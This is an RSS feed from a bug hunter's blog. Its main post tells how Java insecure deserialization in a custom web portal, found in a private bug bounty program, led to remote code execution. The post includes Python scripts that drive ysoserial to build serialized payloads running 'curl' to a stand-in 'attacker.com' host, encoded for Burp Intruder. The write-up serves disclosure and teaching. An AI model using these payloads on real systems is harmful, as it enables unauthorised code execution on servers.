<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>X_X</title>
    <link>/</link>
    <description>Recent content on X_X</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>© LILNIX</copyright>
    <lastBuildDate>Wed, 08 Dec 2021 11:35:46 +0330</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>The Story of an RCE on a Java Web Application</title>
      <link>/posts/the-story-of-a-rce-on-a-java-web-application/</link>
      <pubDate>Thu, 27 Jan 2022 08:56:39 +0330</pubDate>
      
      <guid>/posts/the-story-of-a-rce-on-a-java-web-application/</guid>
      <description>It was about two months ago (November 2021) I was invited to a private program. According to their program scope, I decided to hack them for a while. This post is about a vulnerability I’ve found in this company that led to RCE.
Reconnaissance In this step, my recon methodology was not finding some unique subdomains or assets. I was searching for some web applications with some interesting features such as login or file upload.</description>
      <content>&lt;p&gt;It was about two months ago (November 2021) I was invited to a private program. According to their program scope, I decided to hack them for a while. This post is about a vulnerability I’ve found in this company that led to RCE.&lt;/p&gt;
&lt;h2 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h2&gt;
&lt;p&gt;In this step, my recon methodology was not finding some unique subdomains or assets. I was searching for some web applications with some interesting features such as login or file upload. After a while, I came across an interesting portal.&lt;/p&gt;
&lt;p&gt;In the following, I had to recon the portal itself for learning its functionalities. As a normal routine, I tried to use the web application as a normal user (If you don’t understand the normal flow of the application, you can’t break it). I wrote down important things and then opened Burp.&lt;/p&gt;
&lt;h2 id=&#34;discovery&#34;&gt;Discovery&lt;/h2&gt;
&lt;p&gt;I was attracted to the portal because it was custom, this kind of portals, CMSes, or forums are often more vulnerable than public versions (like WordPress). While capturing the requests in Burp, I was testing the sections until I reached a page that contained a list, when I scrolled that, Java Script sent an Ajax request for loading more rows. The request was something like this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://target.com/api/v1/list?size=25&amp;amp;after=rO0aTm90aGluZyBIZXJlIDovIEp1c3QgYSBzZXJpYWxpemVkIHZhbHVlCg==
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;/img/screen1.png&#34; alt=&#34;The request&#34;&gt;&lt;/p&gt;
&lt;p&gt;The first thing I tried was decoding &lt;code&gt;after&lt;/code&gt; parameter value (as you know, it’s a base64). It had a binary value but some characters decoded successfully:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/screen2.png&#34; alt=&#34;Decoded Content&#34;&gt;&lt;/p&gt;
&lt;p&gt;As you can see, &lt;code&gt;java&lt;/code&gt; was decoded, my guess was a serialized value (with some research I was pretty sure because it’s started with &lt;code&gt;rO0&lt;/code&gt;).&lt;/p&gt;
&lt;h2 id=&#34;deserialization&#34;&gt;Deserialization&lt;/h2&gt;
&lt;p&gt;As you know, serialization is the process of translating a data structure or object state into a format that can be stored (e.g. in a file) or transmitted over a network. The opposite operation, extracting a data structure from a series of bytes, is &lt;strong&gt;deserialization&lt;/strong&gt; &lt;a href=&#34;https://en.wikipedia.org/wiki/Serialization&#34;&gt;(Wikipedia)&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Some programs use serialization for storing a state and then deserialization for restoring that state (exactly like the web application we’re testing). But what happens if the program deserializes an insecure input? Here’s where &lt;strong&gt;Insecure Deserialization&lt;/strong&gt; comes into play.&lt;/p&gt;
&lt;p&gt;In this vulnerability (it’s also in OWASP A8:2021), the attacker sends their malicious serialized value as the input of the vulnerable program. This often leads to privilege escalation and RCE. Insecure Deserialization happens in various programming languages but I was focused on Java.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/screen3.png&#34; alt=&#34;Img: geeksforgeeks.com&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;the-vulnerability&#34;&gt;The Vulnerability&lt;/h2&gt;
&lt;p&gt;As I mentioned before, after decoding the serialized value, I started researching deserialization in Java (although I was never interested in white-box stuff, I also researched the serialization functions in Java :) ). As the result of the research, I learned we can give a serialized input in different formats, for example:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Hex signature      -&amp;gt;   AC ED 00 05
Base64 signature   -&amp;gt;   rO0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The target is using base64, so we have to find a way for creating our malicious serialized input for RCE but before that, we should make sure the target is vulnerable. Here I had two ways: 1. Writing a PoC code in Java (I didn’t know Java ) 2. Using available PoC codes in public. I was pretty sure the second way was much better for me (although I didn’t want to be a script-kiddie). So I started searching for some PoC codes in GitHub and found &lt;a href=&#34;https://github.com/frohoff/ysoserial&#34;&gt;ysoserial&lt;/a&gt;. This tool generates various payloads according to the functions or versions, one of these payloads is &lt;em&gt;URLDNS&lt;/em&gt;, you can give it a URL and it generates a payload. The program is vulnerable if we give that the generated payload and get a DNS query from the server. In other words, I had to do an out-of-band test to make sure the application is vulnerable. I generated the payload and gave it to the web application and … :&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/screen4.png&#34; alt=&#34;DNS Query&#34;&gt;&lt;/p&gt;
&lt;p&gt;I got some DNS queries and the target is vulnerable. Let’s exploit it.&lt;/p&gt;
&lt;h2 id=&#34;exploit&#34;&gt;Exploit&lt;/h2&gt;
&lt;p&gt;I was sure I could exploit it but there was a problem. I used ysoserial again but I was shocked because it didn’t work (At least I didn’t find any suitable payload). I gave up and started hunting for other bugs on the portal.&lt;/p&gt;
&lt;p&gt;After 2-3 weeks, I decided to work on it again. Like before, I had to ways: 1. Writing an exploit code for RCE in Java 2. Finding an exploit code in GitHub (or anywhere). I chose the second way (there’s often an exploit code). This time I found some ysoserial forks with some additional payloads/options. I couldn’t test these payloads manual (they were too much). So I wrote a python script to generate all the possible payloads and save them in a file. Then I gave that file to &lt;strong&gt;Burp Intruder&lt;/strong&gt; but again, didn’t work. The final version of the script was something like this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os

modes &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [] &lt;span style=&#34;color:#75715e&#34;&gt;# All payload names here&lt;/span&gt;

collab &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;attacker.com&amp;#34;&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;curl -s https://rce.{collab}/poc&amp;#34;&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;):

    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; mode &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; modes:
            result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;popen(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;java -jar ysoserial&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; f&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{i}&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.jar &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; mode &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#34;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#34; | base64 -w 0&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()

    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; result &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(result)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Donno but something is going wrong :/&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;the-second-try&#34;&gt;The Second Try&lt;/h2&gt;
&lt;p&gt;When I didn’t get any request from the target, I kind of gave up but I took a look at the responses. Some status codes were 400 or some other responses contained a Java error. With some troubleshooting, I noticed some characters in base64 break the request (e.g. &lt;code&gt;+&lt;/code&gt;). So I had to modify my python script and URL encode the payloads before saving them. For the second time, I gave the new wordlist to my Burp Intruder and after a few seconds:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/screen5.png&#34; alt=&#34;Curl&#34;&gt;&lt;/p&gt;
&lt;p&gt;This means I was able to execute my commands on the server (RCE). After finding the correct payload and the correct ysoserial fork, I wrote an exploit code in Python for easier reproducing:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; urllib.parse

mode &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;THAT_FOUNDED_SUITABLE_MODE&amp;#34;&lt;/span&gt;

collab &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Enter your collaborator domain (e.g. attacker.com)&amp;gt; &amp;#34;&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;curl -s https://{collab}/poc&amp;#34;&lt;/span&gt;

result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;popen(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;java -jar ysoserial4.jar &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; mode &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#34;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#34; | base64 -w0&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()

encoded &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; urllib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;parse&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;quote_plus(result)

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; encoded &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Copy the following payload:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(encoded)
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Donno but something is going wrong :/&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Finally, I created &lt;code&gt;/tmp/poc.txt&lt;/code&gt; and reported the vulnerability. For PoC, this would be enough.&lt;/p&gt;
&lt;h2 id=&#34;lessons-learned&#34;&gt;Lessons Learned&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Always decode any base64 or other encoded texts.&lt;/li&gt;
&lt;li&gt;Public tools are good but if I wrote my own exploit code in Java, I would find this vulnerability much faster.&lt;/li&gt;
&lt;li&gt;Always test every functionality, sometimes, you have to scroll the page :)&lt;/li&gt;
&lt;li&gt;Sometimes, we have to do those boring works too.&lt;/li&gt;
&lt;li&gt;By default, Burp Intruder encodes the given payloads. But this feature was off in my Burp, although I solved that in my Python script, I figured out that feature was a better solution.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;resources&#34;&gt;Resources&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.geeksforgeeks.org/serialization-in-java/&#34;&gt;https://www.geeksforgeeks.org/serialization-in-java/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/frohoff/ysoserial&#34;&gt;https://github.com/frohoff/ysoserial&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.baeldung.com/java-serialization&#34;&gt;https://www.baeldung.com/java-serialization&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.javatpoint.com/serialization-in-java&#34;&gt;https://www.javatpoint.com/serialization-in-java&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.tutorialspoint.com/java/java_serialization.htm&#34;&gt;https://www.tutorialspoint.com/java/java_serialization.htm&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    </item>
    
    <item>
      <title>Hello World</title>
      <link>/posts/hello-world/</link>
      <pubDate>Wed, 08 Dec 2021 12:29:02 +0330</pubDate>
      
      <guid>/posts/hello-world/</guid>
      <description>Hello world :)
As you know, I&amp;rsquo;m LIL NIX x_x, just a hacker and this is my first post. Here I will share my findings, hope you enjoy.</description>
      <content>&lt;p&gt;Hello world :)&lt;/p&gt;
&lt;p&gt;As you know, I&amp;rsquo;m &lt;strong&gt;LIL NIX&lt;/strong&gt; x_x, just a hacker and this is my first post. Here I will share my findings, hope you enjoy.&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>About</title>
      <link>/about/</link>
      <pubDate>Wed, 08 Dec 2021 11:35:46 +0330</pubDate>
      
      <guid>/about/</guid>
      <description>I&amp;rsquo;m LIL NIX x_x ! A punk and a hacker (actually bug hunter)
I started programming since 2016 and hacking since 2019.
I usually listen to Eminem, 2pac and other rap legends.
LIL loves web hacking a lot and his favorite vulnerabilities are IDOR and SSRF.</description>
      <content>&lt;p&gt;I&amp;rsquo;m &lt;strong&gt;LIL NIX&lt;/strong&gt; x_x ! A punk and a hacker (actually bug hunter)&lt;/p&gt;
&lt;p&gt;I started programming since 2016 and hacking since 2019.&lt;/p&gt;
&lt;p&gt;I usually listen to Eminem, 2pac and other rap legends.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;LIL&lt;/strong&gt; loves web hacking a lot and his favorite vulnerabilities are IDOR and SSRF.&lt;/p&gt;
</content>
    </item>
    
  </channel>
</rss>
